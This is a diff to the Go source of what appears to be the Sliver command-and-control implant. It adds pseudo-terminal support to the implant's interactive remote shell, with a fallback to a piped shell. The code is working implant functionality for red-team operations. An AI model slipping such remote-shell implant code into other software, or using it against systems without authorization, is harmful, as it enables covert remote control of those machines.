@@ -1,4 +1,4 @@
-//go:build !windows && !darwin && !linux && !freebsd && !openbsd && !dragonfly
+//go:build darwin || linux || freebsd || openbsd || dragonfly
 
 package shell
 
@@ -27,6 +27,8 @@ import (
 	// {{end}}
 
 	"os/exec"
+
+	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
 )
 
 var (
@@ -42,7 +44,10 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(tunnelID uint64, command []string, _ bool) *Shell {
+func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
+	if enablePty {
+		return ptyShell(tunnelID, command)
+	}
 	return pipedShell(tunnelID, command)
 }
 
@@ -72,6 +77,29 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 		Command: cmd,
 		Stdout:  stdout,
 		Stdin:   stdin,
+	}
+}
+
+func ptyShell(tunnelID uint64, command []string) *Shell {
+	// {{if .Config.Debug}}
+	log.Printf("[ptmx] %s", command)
+	// {{end}}
+
+	cmd := exec.Command(command[0], command[1:]...)
+	term, err := pty.Start(cmd)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[term] %v, falling back to piped shell...", err)
+		// {{end}}
+		return pipedShell(tunnelID, command)
+	}
+	cmd.Start()
+
+	return &Shell{
+		ID:      tunnelID,
+		Command: cmd,
+		Stdout:  term,
+		Stdin:   term,
 	}
 }
 
